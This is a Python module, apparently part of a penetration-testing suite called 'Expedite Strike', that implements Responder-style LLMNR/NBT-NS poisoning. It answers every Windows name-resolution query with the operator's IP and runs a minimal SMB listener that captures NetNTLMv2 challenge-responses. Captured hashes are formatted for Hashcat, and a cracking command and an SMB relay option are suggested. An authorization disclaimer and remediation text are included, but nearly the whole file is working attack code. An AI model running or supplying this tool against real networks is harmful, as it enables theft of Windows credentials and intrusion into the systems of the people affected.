"""
Expedite Strike — LLMNR / NBT-NS Poisoning Engine
===================================================
For use ONLY on networks where written authorization has been obtained.
Simulates Responder-style LLMNR/NBT-NS poisoning to capture NetNTLMv2
challenge-response hashes from Windows clients.

MITRE ATT&CK:
  T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
  T1040     — Network Sniffing

How it works:
  1. Listen on UDP 5355 (LLMNR) and UDP 137 (NBT-NS)
  2. Respond to ANY name-resolution query with our IP
  3. Windows clients auto-authenticate to our IP via SMB/HTTP
  4. Capture the NetNTLMv2 challenge/response for offline cracking
"""

import os
import socket
import struct
import threading
import time
import hashlib
import hmac
import secrets
import ipaddress
from typing import Callable, Optional, List, Dict

# ── State ──────────────────────────────────────────────────────────────────────
_log_fn: Optional[Callable] = None
_captured_hashes: List[Dict] = []
_running = False
_threads: List[threading.Thread] = []

LLMNR_PORT  = 5355
NBTNS_PORT  = 137
LLMNR_MCAST = "224.0.0.252"


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


# ── NetNTLMv2 Challenge/Response Handler ───────────────────────────────────────

def _build_ntlm_challenge() -> bytes:
    """Build a minimal NTLM CHALLENGE message (Type 2)."""
    challenge = secrets.token_bytes(8)
    # NTLM signature + type 2 header
    sig      = b"NTLMSSP\x00"
    msg_type = struct.pack("<I", 2)
    # Target name "EXPEDITE" as UTF-16LE
    target   = "EXPEDITE".encode("utf-16-le")
    tgt_len  = struct.pack("<HH", len(target), len(target))
    tgt_off  = struct.pack("<I", 56)
    flags    = struct.pack("<I", 0x00028201)  # NTLM2 + Unicode + Always56
    ntlm_challenge = challenge
    # Reserved
    reserved = b"\x00" * 8
    # Target info block (empty)
    ti_len   = struct.pack("<HH", 0, 0)
    ti_off   = struct.pack("<I", 56 + len(target))
    header = sig + msg_type + tgt_len + tgt_off + flags + ntlm_challenge + reserved + ti_len + ti_off
    return header + target, challenge


def _parse_ntlm_auth(data: bytes) -> Optional[Dict]:
    """Parse NTLM AUTHENTICATE (Type 3) message and extract hash components."""
    try:
        if b"NTLMSSP\x00" not in data:
            return None
        idx = data.index(b"NTLMSSP\x00")
        buf = data[idx:]
        if len(buf) < 12:
            return None
        msg_type = struct.unpack_from("<I", buf, 8)[0]
        if msg_type != 3:
            return None

        def _read_sec_buf(offset):
            length = struct.unpack_from("<H", buf, offset)[0]
            off    = struct.unpack_from("<I", buf, offset + 4)[0]
            if off + length > len(buf):
                return b""
            return buf[off:off + length]

        lm_resp  = _read_sec_buf(12)
        nt_resp  = _read_sec_buf(20)
        domain   = _read_sec_buf(28).decode("utf-16-le", errors="replace")
        username = _read_sec_buf(36).decode("utf-16-le", errors="replace")

        if not username or len(nt_resp) < 24:
            return None

        # NetNTLMv2 hash format for Hashcat -m 5600
        ntproofstr = nt_resp[:16].hex()
        blob       = nt_resp[16:].hex()

        return {
            "username": username,
            "domain":   domain,
            "ntproofstr": ntproofstr,
            "blob":     blob,
        }
    except Exception:
        return None


# ── LLMNR Response Builder ─────────────────────────────────────────────────────

def _parse_llmnr_query(data: bytes) -> Optional[str]:
    """Parse LLMNR query and return the queried name."""
    try:
        if len(data) < 12:
            return None
        # LLMNR header: ID(2) FLAGS(2) QDCOUNT(2) ANCOUNT(2) NSCOUNT(2) ARCOUNT(2)
        flags    = struct.unpack_from(">H", data, 2)[0]
        qdcount  = struct.unpack_from(">H", data, 4)[0]
        is_query = (flags & 0x8000) == 0
        if not is_query or qdcount == 0:
            return None
        # Parse QNAME
        pos  = 12
        name = []
        while pos < len(data):
            length = data[pos]
            if length == 0:
                break
            pos += 1
            name.append(data[pos:pos + length].decode("ascii", errors="replace"))
            pos += length
        return ".".join(name) if name else None
    except Exception:
        return None


def _build_llmnr_response(query_data: bytes, our_ip: str) -> bytes:
    """Build LLMNR response claiming our_ip for any queried name."""
    try:
        tx_id   = query_data[:2]
        flags   = struct.pack(">H", 0x8000)  # Response flag
        qdcount = struct.pack(">H", 1)
        ancount = struct.pack(">H", 1)
        nscount = struct.pack(">HH", 0, 0)
        # Copy question section
        question = query_data[12:]
        # Build answer: pointer to name + A record
        answer = b"\xc0\x0c"  # pointer to offset 12 (question name)
        answer += struct.pack(">HHI", 1, 1, 30)  # Type A, Class IN, TTL 30
        answer += struct.pack(">H", 4)            # RDLENGTH
        answer += socket.inet_aton(our_ip)         # our IP
        return tx_id + flags + qdcount + ancount + nscount + question + answer
    except Exception:
        return b""


# ── NBT-NS Response Builder ────────────────────────────────────────────────────

def _parse_nbtns_query(data: bytes) -> Optional[str]:
    """Parse NBT-NS query and return the queried NetBIOS name."""
    try:
        if len(data) < 12:
            return None
        opcode = (struct.unpack_from(">H", data, 2)[0] >> 11) & 0xF
        if opcode != 0:
            return None
        # Decode NBT name (first label after header, 32 encoded chars = 16 byte name)
        if len(data) < 46:
            return None
        encoded = data[13:45]
        name    = ""
        for i in range(0, 32, 2):
            c = chr(((encoded[i] - 0x41) << 4) | (encoded[i + 1] - 0x41))
            name += c
        return name.rstrip().rstrip("\x00").rstrip()
    except Exception:
        return None


def _build_nbtns_response(query_data: bytes, our_ip: str) -> bytes:
    """Build NBT-NS response pointing to our IP."""
    try:
        tx_id   = query_data[:2]
        flags   = struct.pack(">H", 0x8500)
        counts  = struct.pack(">HHHH", 0, 1, 0, 0)
        name_q  = query_data[12:46]  # 34 bytes of encoded name + type
        # RR answer
        rdata   = struct.pack(">HH", 0x0000, 0x0001)  # Unique, B-node
        rdata  += socket.inet_aton(our_ip)
        answer  = name_q + struct.pack(">HHI", 0x0020, 0x0001, 30)
        answer += struct.pack(">H", len(rdata)) + rdata
        return tx_id + flags + counts + answer
    except Exception:
        return b""


# ── Minimal SMB Handler to Capture Hashes ─────────────────────────────────────

def _handle_smb_connection(conn: socket.socket, addr: str,
                            challenge: bytes, challenge_hex: str):
    """Handle incoming SMB connection and extract NetNTLMv2 hash."""
    try:
        conn.settimeout(10)
        # Receive NetBIOS session request
        data = conn.recv(4096)
        if not data:
            return

        # Send SMB negotiate response (minimal)
        # NetBIOS header + SMB1 negotiate response pointing to NTLMSSP
        smb_neg = (
            b"\x00\x00\x00\x51"           # NetBIOS length
            b"\xffSMB"                     # SMB magic
            b"\x72"                        # Negotiate Protocol
            b"\x00\x00\x00\x00"           # NT Status OK
            b"\x18\x53\xc8\x00"           # Flags
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00"                   # TID, PID, UID, MID
            b"\x11"                       # Word count 17
            b"\x03\x00"                   # Dialect index 3 (NTLM)
            b"\x01"                       # Security mode: user-level
            b"\x00\x00"                   # Max mpx
            b"\x01\x00"                   # Max VCs
            b"\x00\x10\x00\x00"          # Max buffer size
            b"\x00\x00\x00\x00"          # Max raw
            b"\x00\x00\x00\x00"          # Session key
            b"\x01\x00\x02\xd0"          # Capabilities
            b"\x00\x00\x00\x00\x00\x00\x00\x00"  # System time
            b"\x00\x00"                   # Server TZ
            b"\x08"                       # Encryption key length
            + challenge +                 # 8-byte challenge
            b"\x00\x00"                   # Byte count
        )
        conn.send(smb_neg)

        # Receive SMB session setup (contains NTLM Auth)
        data2 = conn.recv(4096)
        if data2:
            result = _parse_ntlm_auth(data2)
            if result:
                hash_str = (
                    f"{result['username']}::{result['domain']}:"
                    f"{challenge_hex}:{result['ntproofstr']}:{result['blob']}"
                )
                result["hash_str"] = hash_str
                result["host"]     = addr
                _captured_hashes.append(result)
                _log(f"  [LLMNR] ✅ Hash captured: {result['username']}@{result['domain']} from {addr}")
                _log(f"  [LLMNR] NetNTLMv2: {hash_str[:80]}...")
    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass


# ── Listener Threads ───────────────────────────────────────────────────────────

def _llmnr_listener(our_ip: str, stop_event: threading.Event):
    """UDP 5355 LLMNR multicast listener."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)
        try:
            sock.bind(("", LLMNR_PORT))
        except PermissionError:
            _log("  [LLMNR] ⚠ Need admin/root to bind UDP 5355 — try running as Administrator")
            return
        except OSError as e:
            _log(f"  [LLMNR] ⚠ Cannot bind UDP 5355: {e}")
            return

        # Join multicast group
        try:
            mreq = struct.pack("4s4s",
                socket.inet_aton(LLMNR_MCAST),
                socket.inet_aton(our_ip))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        except Exception:
            pass

        _log(f"  [LLMNR] 🎧 Listening on UDP {LLMNR_PORT} (LLMNR multicast)...")
        while not stop_event.is_set():
            try:
                data, addr = sock.recvfrom(1024)
                name = _parse_llmnr_query(data)
                if name:
                    _log(f"  [LLMNR] Query for '{name}' from {addr[0]} — responding with {our_ip}")
                    response = _build_llmnr_response(data, our_ip)
                    if response:
                        sock.sendto(response, addr)
            except socket.timeout:
                continue
            except Exception:
                continue
        sock.close()
    except Exception as e:
        _log(f"  [LLMNR] Error: {e}")


def _nbtns_listener(our_ip: str, stop_event: threading.Event):
    """UDP 137 NBT-NS listener."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)
        try:
            sock.bind(("", NBTNS_PORT))
        except PermissionError:
            _log("  [NBT-NS] ⚠ Need admin/root to bind UDP 137")
            return
        except OSError as e:
            _log(f"  [NBT-NS] ⚠ Cannot bind UDP 137: {e}")
            return

        _log(f"  [NBT-NS] 🎧 Listening on UDP {NBTNS_PORT} (NetBIOS Name Service)...")
        while not stop_event.is_set():
            try:
                data, addr = sock.recvfrom(1024)
                name = _parse_nbtns_query(data)
                if name:
                    _log(f"  [NBT-NS] Query for '{name}' from {addr[0]} — responding with {our_ip}")
                    response = _build_nbtns_response(data, our_ip)
                    if response:
                        sock.sendto(response, addr)
            except socket.timeout:
                continue
            except Exception:
                continue
        sock.close()
    except Exception as e:
        _log(f"  [NBT-NS] Error: {e}")


def _smb_listener(our_ip: str, stop_event: threading.Event):
    """TCP 445 SMB listener to capture NetNTLMv2 hashes."""
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.settimeout(1.0)
        try:
            srv.bind(("", 445))
        except PermissionError:
            _log("  [LLMNR/SMB] ⚠ Need admin to bind TCP 445 — hashes will not be captured directly")
            # Fall back to HTTP port 80 as capture point
            try:
                srv.bind(("", 8445))
                _log("  [LLMNR/SMB] Fallback listener on TCP 8445")
            except Exception:
                return
        except OSError as e:
            _log(f"  [LLMNR/SMB] ⚠ Cannot bind TCP 445: {e}")
            return

        srv.listen(5)
        _, challenge = _build_ntlm_challenge()
        challenge_hex = challenge.hex()

        while not stop_event.is_set():
            try:
                conn, addr = srv.accept()
                t = threading.Thread(
                    target=_handle_smb_connection,
                    args=(conn, addr[0], challenge, challenge_hex),
                    daemon=True
                )
                t.start()
            except socket.timeout:
                continue
            except Exception:
                continue
        srv.close()
    except Exception as e:
        _log(f"  [LLMNR/SMB] Error: {e}")


# ── Public API ─────────────────────────────────────────────────────────────────

class LLMNRPoisoner:
    """Context-manager-style LLMNR/NBT-NS poisoner."""

    def __init__(self):
        self._stop   = threading.Event()
        self._threads: List[threading.Thread] = []

    def start(self, our_ip: str, log_fn: Callable = None):
        global _log_fn, _captured_hashes
        _log_fn = log_fn
        _captured_hashes.clear()
        self._stop.clear()

        for target_fn in (_llmnr_listener, _nbtns_listener, _smb_listener):
            t = threading.Thread(
                target=target_fn,
                args=(our_ip, self._stop),
                daemon=True
            )
            t.start()
            self._threads.append(t)

    def stop(self):
        self._stop.set()
        for t in self._threads:
            t.join(timeout=3)
        self._threads.clear()

    def get_captured_hashes(self) -> List[Dict]:
        return list(_captured_hashes)


def _get_local_ip() -> str:
    """Get the local machine's outbound IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def run_llmnr_poisoning(
    interface: str = "",
    duration_seconds: int = 60,
    our_ip: str = "",
    log_fn: Callable = None,
) -> dict:
    """
    Run LLMNR/NBT-NS poisoning for duration_seconds.

    Args:
        interface:        Network interface name (informational, not used on Windows)
        duration_seconds: How long to listen (default 60s)
        our_ip:           IP to spoof as answer (auto-detected if empty)
        log_fn:           Logging callback

    Returns:
        {hashes, findings, mitre, summary}
    """
    global _log_fn, _captured_hashes
    _log_fn = log_fn
    _captured_hashes.clear()

    if not our_ip:
        our_ip = _get_local_ip()

    _log(f"\n{'='*60}")
    _log(f"  [LLMNR] LLMNR/NBT-NS Poisoning Engine")
    _log(f"  [LLMNR] Attacker IP : {our_ip}")
    _log(f"  [LLMNR] Duration    : {duration_seconds}s")
    _log(f"  [LLMNR] Interface   : {interface or 'auto'}")
    _log(f"{'='*60}\n")

    poisoner = LLMNRPoisoner()
    poisoner.start(our_ip, log_fn)

    _log(f"  [LLMNR] ⏳ Poisoning active for {duration_seconds}s — waiting for Windows clients...")

    start = time.time()
    while time.time() - start < duration_seconds:
        time.sleep(2)
        captured = len(_captured_hashes)
        if captured > 0:
            _log(f"  [LLMNR] 🎯 {captured} hash(es) captured so far...")

    poisoner.stop()

    hashes   = poisoner.get_captured_hashes()
    findings = []

    if hashes:
        for h in hashes:
            findings.append({
                "title":       f"NetNTLMv2 Hash Captured — {h.get('username', '?')}@{h.get('domain', '?')}",
                "severity":    "Critical",
                "description": (
                    f"LLMNR/NBT-NS poisoning captured a NetNTLMv2 challenge-response from "
                    f"{h.get('host', '?')}. Hash can be cracked offline with Hashcat "
                    f"(mode 5600) or relayed via SMB Relay. "
                    f"Hash: {h.get('hash_str', '')[:80]}..."
                ),
                "target":      h.get("host", ""),
                "username":    h.get("username", ""),
                "domain":      h.get("domain", ""),
                "hash_str":    h.get("hash_str", ""),
                "mitre_id":    "T1557.001",
                "mitre_name":  "LLMNR/NBT-NS Poisoning and SMB Relay",
                "remediation": (
                    "Disable LLMNR via GPO: Computer Config → Admin Templates → Network → DNS Client → "
                    "'Turn off multicast name resolution' = Enabled. "
                    "Disable NBT-NS in Network Adapter → Advanced TCP/IP settings."
                ),
            })
        _log(f"\n  [LLMNR] ✅ Captured {len(hashes)} NetNTLMv2 hash(es)")
        _log(f"  [LLMNR] Run: hashcat -m 5600 hashes.txt rockyou.txt")
    else:
        _log(f"  [LLMNR] No hashes captured in {duration_seconds}s")
        _log(f"  [LLMNR] Tip: Ensure you are on same subnet as Windows clients")

    return {
        "hashes":   hashes,
        "findings": findings,
        "our_ip":   our_ip,
        "duration": duration_seconds,
        "mitre": [
            {"id": "T1557.001", "name": "LLMNR/NBT-NS Poisoning and SMB Relay"},
            {"id": "T1040",     "name": "Network Sniffing"},
        ],
        "summary": f"Captured {len(hashes)} NetNTLMv2 hash(es) via LLMNR/NBT-NS poisoning",
    }


def run_nbtns_poisoning(
    interface: str = "",
    duration_seconds: int = 60,
    our_ip: str = "",
    log_fn: Callable = None,
) -> dict:
    """NBT-NS only variant — identical to run_llmnr_poisoning but focuses on UDP 137."""
    return run_llmnr_poisoning(interface, duration_seconds, our_ip, log_fn)
